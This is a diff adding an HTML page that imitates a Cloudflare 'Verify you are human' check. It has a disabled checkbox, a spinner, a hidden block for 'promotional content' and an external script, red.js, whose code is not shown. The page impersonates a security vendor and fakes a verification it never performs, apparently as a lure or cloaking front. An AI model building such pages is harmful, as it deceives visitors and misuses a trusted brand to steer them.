@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification Page</title>
+  <style>
+    :root {
+      --bg: #101923; /* page background */
+      --ring: #1fe88a; /* ring color */
+      --size: 40px; /* widget box size (just for layout) */
+      --thickness: 3px; /* ring stroke width (matches your 0.1em-ish) */
+      --duration: 2s; /* one ring life — like your keyframes */
+      --start-scale: 0.6; /* ring starts smaller */
+      --end-scale: 2.6; /* final radius */
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg);
+      color: #cfd8e3;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .logo {
+      margin-top: 50px;
+      font-size: 24px;
+      color: var(--ring);
+      display: flex;
+      align-items: center;
+    }
+
+    .logo::before {
+      content: '🦁👑';
+      margin-right: 10px;
+    }
+
+    .message {
+      margin-top: 50px;
+      font-size: 16px;
+      text-align: center;
+    }
+
+    .verification-box {
+      margin-top: 20px;
+      background-color: #ffffff;
+      color: #000000;
+      padding: 10px 20px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 200px;
+      position: relative;
+      font-size: 14px;
+    }
+
+    .verification-box input[type="checkbox"] {
+      margin-right: 10px;
+    }
+
+    .cloudflare {
+      font-size: 12px;
+      color: #ff9800;
+      margin-left: 10px;
+    }
+
+    .privacy-terms {
+      margin-top: 5px;
+      font-size: 12px;
+      color: #98a6b3;
+    }
+
+    .refresh-message {
+      margin-top: 10px;
+      font-size: 14px;
+      text-align: center;
+      color: #98a6b3;
+    }
+
+    /* —— RING RIPPLE —— */
+    .preloader {
+      position: relative;
+      width: var(--size);
+      height: var(--size);
+      margin-top: 100px;
+    }
+
+    .preloader span {
+      display: block;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      width: 16px;
+      height: 16px; /* the seed size (like your 1em box) */
+      transform: translate(-50%, -50%) scale(var(--start-scale));
+      border: var(--thickness) solid var(--ring);
+      border-radius: 50%;
+      opacity: 1;
+      animation: ripple var(--duration) ease-out infinite;
+      /* subtle glow like the page */
+      filter: drop-shadow(0 0 6px rgba(31, 232, 138, .35));
+    }
+
+    /* second ring starts half-way through the first one */
+    .preloader span:nth-child(2) {
+      animation-delay: calc(var(--duration) / -2);
+    }
+
+    @keyframes ripple {
+      0% {
+        transform: translate(-50%, -50%) scale(var(--start-scale));
+        opacity: 1;
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(var(--end-scale));
+        opacity: 0;
+      }
+    }
+
+    /* Spinner for verifying */
+    .spinner {
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #555;
+      border-radius: 50%;
+      width: 12px;
+      height: 12px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Hide content initially */
+    #content {
+      display: none;
+      text-align: center;
+      margin-top: 100px;
+    }
+
+    /* Loading screen */
+    #loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">
+    <div class="logo">Please wait...</div>
+
+    <div class="preloader" aria-label="Verifying">
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="message">
+      Verifying you are human automatically. This may take a few seconds.
+    </div>
+
+    <div class="verification-box">
+      <input type="checkbox" disabled>
+      Verify you are human
+      <span class="cloudflare">CLOUDFLARE</span>
+    </div>
+
+    <div class="privacy-terms">Privacy - Terms</div>
+    <div class="refresh-message">Please refresh the page if verification fails.</div>
+  </div>
+
+  <div id="content">
+    <!-- Add your promotional content here -->
+  </div>
+
+  <script src="assets/js/red.js" defer></script>
+</body>
+</html>
